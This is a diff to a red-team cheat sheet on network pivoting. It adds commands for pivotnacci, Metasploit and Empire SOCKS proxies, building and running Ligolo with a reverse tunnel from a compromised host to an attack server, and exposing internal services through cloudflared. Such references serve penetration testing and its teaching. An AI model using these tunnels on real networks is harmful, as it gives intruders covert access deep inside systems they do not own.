@@ -10,6 +10,7 @@
 * [Proxychains](#proxychains)
 * [Graphtcp](#graphtcp)
 * [Web SOCKS - reGeorg](#web-socks---regeorg)
+* [Web SOCKS - pivotnacci](#web-socks---pivotnacci)
 * [Metasploit](#metasploit)
 * [sshuttle](#sshuttle)
 * [chisel](#chisel)
@@ -118,6 +119,17 @@ optional arguments:
   -v , --verbose       Verbose output[INFO|DEBUG]
 ```
 
+## Web SOCKS - pivotnacci
+
+[pivotnacci](https://github.com/blackarrowsec/pivotnacci), a tool to make socks connections through HTTP agents.
+
+```powershell
+pip3 install pivotnacci
+pivotnacci  https://domain.com/agent.php --password "s3cr3t"
+pivotnacci  https://domain.com/agent.php --polling-interval 2000
+```
+
+
 ## Metasploit
 
 ```powershell
@@ -138,7 +150,12 @@ or
 
 # Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
 run autoroute -s 192.168.15.0/24 
-use auxiliary/server/socks4a
+use auxiliary/server/socks_proxy
+set SRVPORT 9090
+set VERSION 4a
+# or
+use auxiliary/server/socks4a     # (deprecated)
+
 
 # Meterpreter list all active routes
 run autoroute -p 
@@ -150,6 +167,15 @@ route add 192.168.14.0 255.255.255.0 3
 route delete 192.168.14.0 255.255.255.0 3 
 # Meterpreter delete all routes
 route flush 
+```
+
+## Empire
+
+```powershell
+(Empire) > socksproxyserver
+(Empire) > use module management/invoke_socksproxy
+(Empire) > set remoteHost 10.10.10.10
+(Empire) > run
 ```
 
 ## sshuttle
@@ -200,6 +226,33 @@ server : run the Server Component of chisel
 
 user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks
 ```
+
+## Ligolo
+
+Ligolo : Reverse Tunneling made easy for pentesters, by pentesters
+
+
+1. Build Ligolo
+  ```powershell
+  # Get Ligolo and dependencies
+  cd `go env GOPATH`/src
+  git clone https://github.com/sysdream/ligolo
+  cd ligolo
+  make dep
+
+  # Generate self-signed TLS certificates (will be placed in the certs folder)
+  make certs TLS_HOST=example.com
+
+  make build-all
+  ```
+2. Use Ligolo
+  ```powershell
+  # On your attack server.
+  ./bin/localrelay_linux_amd64
+
+  # On the compromise host.
+  ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
+  ```
 
 ## Gost
 
@@ -310,7 +363,17 @@ unzip ngrok-stable-linux-amd64.zip
 ./ngrok tcp 4433
 ```
 
+## cloudflared
 
+```bash
+# Get the binary
+wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
+tar xvzf cloudflared-stable-linux-amd64.tgz
+# Expose accessible internal service to the internet
+./cloudflared tunnel --url <protocol>://<host>:<port>
+```
+  
+  
 ## Basic Pivoting Types
 
 | Type              | Use Case                                    |
@@ -348,7 +411,6 @@ unzip ngrok-stable-linux-amd64.zip
 
 ## References
 
-* [Network Pivoting Techniques - Bit rot](https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
 * [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
 * [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
 * [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
